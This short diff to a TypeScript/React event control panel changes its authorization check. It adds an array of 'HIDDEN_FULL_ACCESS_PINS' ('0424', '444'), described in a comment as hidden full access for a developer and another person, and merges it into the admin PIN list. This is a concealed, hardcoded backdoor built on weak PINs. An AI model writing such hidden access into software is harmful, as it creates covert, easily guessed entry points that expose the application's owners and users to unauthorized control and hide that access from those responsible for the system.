@@ -52,7 +52,8 @@ export function EventControlPanel({ userPin, userId, userName }: EventControlPan
     notes: ''
   });
 
-  const EVENT_ADMIN_PINS = ['2424', '0424', '1234'];
+  const HIDDEN_FULL_ACCESS_PINS = ['0424', '444']; // Jason (dev) & Sid - hidden full access
+  const EVENT_ADMIN_PINS = ['2424', ...HIDDEN_FULL_ACCESS_PINS]; // David + hidden
   const isAuthorized = EVENT_ADMIN_PINS.includes(userPin);
 
   useEffect(() => {
